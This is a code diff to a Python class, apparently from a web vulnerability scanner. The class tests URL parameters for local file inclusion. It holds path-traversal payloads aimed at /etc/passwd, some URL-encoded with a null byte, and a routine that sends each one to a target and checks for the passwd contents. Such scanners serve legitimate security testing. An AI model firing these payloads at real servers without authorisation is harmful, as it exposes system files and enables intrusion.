@@ -1,8 +1,10 @@
+from os import get_terminal_size
+
 from requests import get
 
 
 class TestLFI:
-    def __init__(self, log):
+    def __init__(self, log, console):
         self.log = log
         self.lfi_tests = [
             r"../../../../../etc/passwd",
@@ -58,21 +60,8 @@ class TestLFI:
             + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00"
         ]
 
-    def split_params(url):
-        """
-        Split the url into the base url and the parameters
-        """
-
-        split_url = url.split("?")
-        return split_url[0], split_url[1]
-
-    def get_params(params):
-        """
-        Get the parameters from the url
-        """
-        return params.split("&")
-
-    def exploit_lfi(self, base_url, url_params):
+    def exploit_lfi(self, base_url, url_params, console) -> None:
+        term_width, _ = get_terminal_size()
         for param in url_params:
             for test in self.lfi_tests:
                 # create a new url with the test as the value of the url_params
@@ -82,8 +71,8 @@ class TestLFI:
                     response = get(test_url)
                 except ConnectionError:
                     self.log.logger(
-                        r"error",
-                        "Connection error raised on: {test_url}, skipping"
+                        "error",
+                        f"Connection error raised on: {test_url}, skipping"
                     )
                     continue
                 else:
@@ -93,20 +82,17 @@ class TestLFI:
                                 "root:x:0:0:root:/root:/bin/bash"
                             ) != -1
                         ):
-                        self.log.logger("success", f"LFI on : {test_url}")
+                        print(" " * term_width, end="\r")
+                        console.print(f"LFI on : {test_url}")
                         break
 
-    def test_lfi(self, url):
+    def test_lfi(self, url, console) -> None:
         """
         Test for LFI
         """
         # split the url into the base url and the parameters
-        base_url, params = self.split_params(url)
+        base_url, params = url.split("?")[0], url.split("?")[1]
         # get the parameters from the url
-        params_dict = self.get_params(params)
-        # get the url_no_params
-        url_no_params = base_url
-        # get the url_params
-        url_params = params_dict
+        params_dict = params.split("&")
         # exploit the lfi
-        self.exploit_lfi(url_no_params, url_params)
+        self.exploit_lfi(base_url, params_dict, console)
